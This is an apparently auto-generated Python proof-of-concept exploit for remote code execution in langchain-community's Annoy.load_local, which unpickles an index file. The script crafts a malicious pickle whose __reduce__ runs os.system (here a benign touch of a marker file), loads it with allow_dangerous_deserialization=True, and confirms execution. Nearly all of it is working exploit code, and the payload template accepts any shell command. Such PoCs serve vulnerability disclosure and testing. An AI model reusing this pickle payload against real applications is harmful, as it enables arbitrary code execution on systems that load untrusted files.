#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_25.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE via pickle deserialization.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load on a file whose path is constructed from user-controlled folder_path.
Although there is a guard (allow_dangerous_deserialization) that must be set to True,
this guard is a developer-facing flag that downstream applications may set to True
without proper validation of the source. An attacker who can control folder_path can
cause pickle.load to load a malicious pickle file, leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Simulating an application that calls load_local with allow_dangerous_deserialization=True
3. Showing that the malicious pickle is loaded and code execution occurs

Usage: python poc_exploit.py [target_folder_path]
"""

import os
import sys
import pickle
import tempfile
import subprocess
from pathlib import Path

# Configuration
TARGET_FOLDER = sys.argv[1] if len(sys.argv) > 1 else "/tmp/poc_target"

def create_malicious_pickle(output_dir: str) -> str:
    """
    Create a malicious pickle file that executes a benign command.
    
    The pickle will execute: touch /tmp/poc_success.txt
    This is a safe, non-destructive command that proves code execution.
    """
    class MaliciousPickle:
        def __reduce__(self):
            # Return a tuple (callable, args) that pickle will execute
            return (os.system, ("touch /tmp/poc_success.txt",))
    
    # Ensure output directory exists
    os.makedirs(output_dir, exist_ok=True)
    
    # Create the malicious pickle file
    pickle_path = os.path.join(output_dir, "index.pkl")
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle file at: {pickle_path}")
    return pickle_path

def simulate_vulnerable_application(folder_path: str):
    """
    Simulate a vulnerable application that calls load_local with
    allow_dangerous_deserialization=True.
    
    This mimics the scenario where a developer sets the flag to True
    to enable functionality, but doesn't validate the source of the data.
    """
    # Import the vulnerable function
    from langchain_community.vectorstores.annoy import Annoy
    
    print(f"[*] Simulating vulnerable application...")
    print(f"[*] Calling load_local with folder_path: {folder_path}")
    print(f"[*] allow_dangerous_deserialization set to: True")
    
    try:
        # This will trigger the pickle.load and execute our malicious payload
        result = Annoy.load_local(
            folder_path=folder_path,
            embeddings=None,  # Not needed for the exploit
            allow_dangerous_deserialization=True
        )
        print(f"[+] load_local completed (may have errors due to missing embeddings)")
    except Exception as e:
        # The exploit may fail after code execution due to missing dependencies
        # But the malicious code should have already executed
        print(f"[*] Exception after load_local (expected): {e}")

def verify_exploit():
    """Verify that the exploit was successful by checking for the marker file."""
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] EXPLOIT SUCCESSFUL! Marker file created: {marker_file}")
        # Clean up the marker file
        os.remove(marker_file)
        return True
    else:
        print("[-] Exploit may have failed - marker file not found")
        return False

def main():
    print("=" * 60)
    print("PoC: langchain-community RCE via pickle deserialization")
    print("=" * 60)
    
    # Step 1: Create malicious pickle file
    print("\n[Step 1] Creating malicious pickle file...")
    create_malicious_pickle(TARGET_FOLDER)
    
    # Step 2: Simulate the vulnerable application
    print("\n[Step 2] Simulating vulnerable application...")
    simulate_vulnerable_application(TARGET_FOLDER)
    
    # Step 3: Verify exploit success
    print("\n[Step 3] Verifying exploit...")
    success = verify_exploit()
    
    if success:
        print("\n[✓] Vulnerability confirmed: RCE via pickle deserialization")
        print("    The guard (allow_dangerous_deserialization) does NOT prevent")
        print("    exploitation when set to True, as it relies on the developer")
        print("    to validate the source, which is often not done in practice.")
    else:
        print("\n[!] Exploit verification failed")
        print("    This may be due to missing dependencies or environment issues.")
        print("    The vulnerability is still present in the code logic.")
    
    # Clean up
    print("\n[*] Cleaning up...")
    if os.path.exists(TARGET_FOLDER):
        import shutil
        shutil.rmtree(TARGET_FOLDER)
        print(f"[+] Removed target folder: {TARGET_FOLDER}")

if __name__ == "__main__":
    main()
